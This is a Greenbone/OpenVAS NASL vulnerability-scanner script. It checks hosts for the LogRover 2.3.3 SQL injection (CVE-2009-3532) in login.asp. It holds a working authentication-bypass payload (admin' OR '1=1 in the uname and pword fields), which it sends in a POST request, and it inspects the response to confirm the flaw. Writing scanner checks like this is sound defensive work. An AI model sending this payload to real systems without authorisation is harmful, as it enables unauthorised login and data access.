if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801012" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-10-12 07:28:01 +0200 (Mon, 12 Oct 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-3532" );
	script_name( "LogRover 'uname' and 'pword' SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/35821/" );
	script_xref( name: "URL", value: "http://www.packetstormsecurity.org/0907-advisories/DDIVRT-2009-26.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to conduct SQL
  injection attacks." );
	script_tag( name: "affected", value: "LogRover version 2.3.3 and prior." );
	script_tag( name: "insight", value: "Input passed to the 'uname' and 'pword' parameters in 'login.asp'
  is not properly sanitised before being used in SQL queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with LogRover and is prone to SQL Injection
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
url = "/LogRover/login.asp";
sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 48\\r\\n", "uname=admin%27+OR+%271%3D1&pword=%27+OR+%271%3D1\\r\\n\\r\\n" );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
if(!ContainsString( rcvRes, "Invalid Username or Password" ) && ( ContainsString( rcvRes, "index1.asp" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

